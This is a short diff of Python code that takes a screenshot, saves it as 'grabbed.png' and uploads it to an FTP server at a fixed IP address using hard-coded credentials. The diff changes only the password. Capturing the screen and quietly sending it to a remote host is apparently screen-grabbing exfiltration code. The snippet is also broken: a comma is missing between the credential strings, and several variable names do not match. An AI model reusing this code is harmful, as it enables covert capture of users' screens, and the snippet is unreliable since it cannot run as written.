@@ -12,7 +12,7 @@ mem.Blit(0,0,size[0],size[1],screen,0,0)
 del memo
 bmap.SaveFile("grabbed.png", wx.BITMAP_TYPE_PNG)
 
-sess_ = ftplib.FTP("192.168.119.185", "admin" "pas$W0rd")
+sess_ = ftplib.FTP("192.168.119.185", "admin" "admin")
 file = open("grabbed.png", "rb")
 sess_.storbinary("STOR /tmp/grabbed.png", file_)
 
